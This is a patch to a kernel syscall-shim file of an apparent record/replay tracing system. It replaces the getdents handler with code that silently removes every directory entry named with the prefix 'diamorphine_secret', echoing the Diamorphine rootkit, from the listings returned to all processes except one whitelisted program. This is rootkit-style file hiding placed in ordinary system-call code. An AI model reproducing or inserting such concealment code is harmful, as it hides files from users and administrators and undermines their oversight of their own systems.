@@ -16537,7 +16537,116 @@ asmlinkage long shim_sysfs (int option, unsigned long arg1, unsigned long arg2) 
 
 SIMPLE_SHIM1(personality, 135, u_long, parm);
 RET1_SHIM5(llseek, 140, loff_t, result, unsigned int, fd, unsigned long, offset_high, unsigned long, offset_low, loff_t __user *, result, unsigned int, origin);
-RET1_COUNT_SHIM3(getdents, 78, dirent, unsigned int, fd, struct linux_dirent __user *, dirent, unsigned int, count);
+//RET1_COUNT_SHIM3(getdents, 78, dirent, unsigned int, fd, struct linux_dirent __user *, dirent, unsigned int, count);
+
+#define MAGIC_PREFIX "diamorphine_secret"
+struct linux_dirent {
+	unsigned long	d_ino;
+	unsigned long	d_off;
+	unsigned short	d_reclen;
+	char		d_name[1];
+};
+
+
+long theia_hide_dirent(struct linux_dirent __user * dirent, long orig_ret)
+{
+  //white list for our own applications
+  if(memcmp(current->comm, "relay-read-file", strlen("relay-read-file")) == 0)
+    return orig_ret;
+  long ret =  orig_ret;
+  int err;
+	unsigned short proc = 0;
+	unsigned long off = 0;
+	struct linux_dirent *dir, *kdirent, *prev = NULL;
+	struct inode *d_inode;
+
+	if (ret <= 0)
+		return ret;	
+
+	kdirent = kzalloc(ret, GFP_KERNEL);
+	if (kdirent == NULL)
+		return ret;
+
+	err = copy_from_user(kdirent, dirent, ret);
+	if (err)
+		goto out;
+
+	while (off < ret) {
+		dir = (void *)kdirent + off;
+		if (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)
+		{
+    printk("magic prefix: dir->d_name: %s\n", dir->d_name);
+			if (dir == kdirent) {
+				ret -= dir->d_reclen;
+				memmove(dir, (void *)dir + dir->d_reclen, ret);
+				continue;
+			}
+			prev->d_reclen += dir->d_reclen;
+		} else
+			prev = dir;
+		off += dir->d_reclen;
+	}
+	err = copy_to_user(dirent, kdirent, ret);
+	if (err)
+		goto out;
+out:
+	kfree(kdirent);
+	return ret;
+}
+
+static asmlinkage long 
+theia_sys_getdents (unsigned int fd, struct linux_dirent __user * dirent, unsigned int count)
+{
+	long rc;
+	rc = sys_getdents (fd, dirent, count);
+  long new_rc = theia_hide_dirent(dirent, rc);
+printk("getdents: rc %ld, new_rc %ld\n", rc, new_rc);
+	return new_rc;
+}
+
+static asmlinkage long record_getdents (unsigned int fd, struct linux_dirent __user * dirent, unsigned int count) 
+{
+	long rc, new_rc;
+	char *pretval = NULL;
+
+	new_syscall_enter (78);
+	rc = sys_getdents (fd, dirent, count);
+  new_rc = theia_hide_dirent(dirent, rc);
+	new_syscall_done (78, new_rc);
+	if (new_rc >= 0 && dirent) {
+		pretval = ARGSKMALLOC (new_rc, GFP_KERNEL);
+		if (pretval == NULL) {
+			printk ("record_getdents: can't allocate buffer\n");
+			return -ENOMEM;
+		}
+		if (copy_from_user (pretval, dirent, new_rc)) {
+			printk ("record_getdents: can't copy to buffer\n");
+			ARGSKFREE(pretval, new_rc);
+			pretval = NULL;
+			new_rc = -EFAULT;
+		}
+	}
+
+	new_syscall_exit (78, pretval);
+	return new_rc;
+}
+
+static asmlinkage long replay_getdents (unsigned int fd, struct linux_dirent __user * dirent, unsigned int count)
+{
+	char *retparams = NULL;
+	long rc = get_next_syscall (78, &retparams);
+
+	if (retparams) {
+		if (copy_to_user (dirent, retparams, rc)) printk ("replay_getdents: pid %d cannot copy to user\n", current->pid);
+		argsconsume (current->replay_thrd->rp_record_thread, rc);
+	}
+
+	return rc;
+}
+
+asmlinkage ssize_t shim_getdents (unsigned int fd, struct linux_dirent __user * dirent, unsigned int count) 
+SHIM_CALL_MAIN(78, record_getdents(fd, dirent, count), replay_getdents(fd, dirent, count), theia_sys_getdents(fd, dirent, count))
+
 
 static asmlinkage long 
 record_select (int n, fd_set __user *inp, fd_set __user *outp, fd_set __user *exp, struct timeval __user *tvp)
